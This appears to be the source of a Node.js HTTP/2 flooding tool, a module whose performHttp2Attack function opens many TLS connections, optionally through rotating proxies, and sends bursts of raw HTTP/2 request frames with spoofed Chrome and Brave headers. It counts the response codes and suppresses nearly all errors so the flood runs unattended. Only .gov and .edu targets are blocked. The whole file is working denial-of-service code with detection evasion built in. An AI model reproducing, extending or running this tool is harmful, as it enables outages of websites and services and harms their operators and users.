const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const crypto = require('crypto');
const fs = require('fs');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const blockedDomain = [".gov", ".edu"];

let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;

setInterval(() => {
    timer++;
}, 1000);

setInterval(() => {
    if (timer <= 10) {
        custom_header++;
        custom_window++;
        custom_table++;
        custom_update++;
    } else {
        custom_table = 65535;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;
        timer = 0;
    }
}, 10000);

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload]);
    return frame;
}

function decodeFrame(data) {
    if (data.length < 9) return null;
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    if (data.length < 9 + length) return null;

    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5);
    
    let payload = Buffer.alloc(0);
    if (length > 0) {
        payload = data.subarray(9, 9 + length);
    }

    return { streamId, length, type, flags, payload };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function performHttp2Attack(tlsSocket, url, options, workerStats) {
    const { duration, rate, method, headers: customHeaders, payload } = options;

    if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol !== 'h2') {
        tlsSocket.end(() => tlsSocket.destroy());
        return;
    }

    let streamId = 1;
    let hpack = new HPACK();
    hpack.setTableSize(4096);

    const updateWindow = Buffer.alloc(4);
    updateWindow.writeUInt32BE(custom_update, 0);

    const frames = [
        Buffer.from(PREFACE, 'binary'),
        encodeFrame(0, 4, encodeSettings([
            [1, custom_header],
            [2, 0],
            [4, custom_window],
            [6, custom_table]
        ])),
        encodeFrame(0, 8, updateWindow)
    ];

    tlsSocket.write(Buffer.concat(frames));

    let responseData = Buffer.alloc(0);
    tlsSocket.on('data', (chunk) => {
        responseData = Buffer.concat([responseData, chunk]);

        while (responseData.length >= 9) {
            const frame = decodeFrame(responseData);
            if (frame !== null) {
                responseData = responseData.subarray(frame.length + 9);

                if (frame.type === 1) { // HEADERS frame
                    try {
                        const headers = hpack.decode(frame.payload);
                        const statusHeader = headers.find(h => h[0] === ':status');
                        if (statusHeader) {
                            const statusCode = parseInt(statusHeader[1], 10);
                            if (!isNaN(statusCode)) {
                                workerStats.statusCodes[statusCode] = (workerStats.statusCodes[statusCode] || 0) + 1;
                                if (statusCode >= 200 && statusCode < 400) {
                                    workerStats.successful++;
                                } else {
                                    workerStats.failed++;
                                }
                            }
                        }
                    } catch (e) {
                        // HPACK decoding error
                    }
                }
            } else {
                break; 
            }
        }
    });

    function doWrite() {
        if (tlsSocket.destroyed) {
            return;
        }
        
        const requests = [];
        for (let i = 0; i < rate; i++) {
            const browserVersion = getRandomInt(120, 123);
            const fwfw = ['Google Chrome', 'Brave'];
            const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
            let brandValue;
            if (browserVersion === 120) {
                brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
            } else if (browserVersion === 121) {
                brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
            } else if (browserVersion === 122) {
                brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
            } else {
                brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
            }
            const isBrave = wfwf === 'Brave';
            const acceptHeaderValue = isBrave ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
            const langValue = isBrave ? 'en-US,en;q=0.9' : 'en-US,en;q=0.7';
            const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
            const secChUa = `${brandValue}`;

            let headers = [
                [':method', method],
                [':authority', url.hostname],
                [':scheme', 'https'],
                [':path', url.pathname + url.search],
                ['sec-ch-ua', secChUa],
                ['sec-ch-ua-mobile', '?0'],
                ['sec-ch-ua-platform', '"Windows"'],
                ['upgrade-insecure-requests', '1'],
                ['user-agent', userAgent],
                ['accept', acceptHeaderValue],
                ['sec-fetch-site', 'none'],
                ['sec-fetch-mode', 'navigate'],
                ['sec-fetch-user', '?1'],
                ['sec-fetch-dest', 'document'],
                ['accept-encoding', 'gzip, deflate, br'],
                ['accept-language', langValue],
            ];

            if (method === 'POST' && payload) {
                headers.push(['content-length', Buffer.byteLength(payload).toString()]);
            }

            if (customHeaders) {
                for (const [key, value] of Object.entries(customHeaders)) {
                    headers.push([key.toLowerCase(), value]);
                }
            }
            
            const packed = Buffer.concat([
                Buffer.from([0x80, 0, 0, 0, 0xFF]),
                hpack.encode(headers)
            ]);

            requests.push(encodeFrame(streamId, 1, packed, 0x25));
            if (method === 'POST' && payload) {
                requests.push(encodeFrame(streamId, 0, Buffer.from(payload), 1));
            }
            streamId += 2;
        }

        tlsSocket.write(Buffer.concat(requests), (err) => {
            if (err) {
                tlsSocket.destroy();
            }
        });
        workerStats.requests += rate;
    }

    const interval = setInterval(doWrite, 1000);

    setTimeout(() => {
        clearInterval(interval);
        tlsSocket.destroy();
    }, duration * 1000);

    tlsSocket.on('error', () => {
        tlsSocket.destroy();
    });
}

function launch(options, workerStats) {
    const { target, connections, proxyFile } = options;
    const url = new URL(target);

    if (blockedDomain.some(domain => url.hostname.endsWith(domain))) {
        console.error(`Error: Target domain is in the blocklist.`);
        return;
    }

    let proxies = [];
    if (proxyFile) {
        try {
            proxies = fs.readFileSync(proxyFile, 'utf8').replace(/\r/g, '').split('\n').filter(Boolean);
        } catch (e) {
            console.error(`Error reading proxy file: ${e.message}`);
            return;
        }
    }

    const tlsOptions = {
        ALPNProtocols: ['h2'],
        servername: url.host,
        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
        secure: true,
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        rejectUnauthorized: false
    };

    function go() {
        const proxy = options.proxy || (proxies.length > 0 ? proxies[~~(Math.random() * proxies.length)] : null);

        if (proxy) {
            const [proxyHost, proxyPort] = proxy.split(':');
            if (!proxyPort || isNaN(proxyPort)) {
                return;
            }

            const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
                netSocket.write(`CONNECT ${url.host}:${url.port || 443} HTTP/1.1\r\nHost: ${url.host}:${url.port || 443}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
                netSocket.once('data', () => {
                    const tlsSocket = tls.connect({ ...tlsOptions, socket: netSocket }, () => {
                        performHttp2Attack(tlsSocket, url, options, workerStats);
                    });
                });
            }).on('error', () => {
                netSocket.destroy();
            });
        } else {
            const tlsSocket = tls.connect({ ...tlsOptions, host: url.hostname, port: url.port || 443 }, () => {
                performHttp2Attack(tlsSocket, url, options, workerStats);
            });
        }
    }

    const connsPerWorker = Math.ceil(connections / (options.workers || 1));
    for (let i = 0; i < connsPerWorker; i++) {
        go();
    }
}

module.exports = { launch };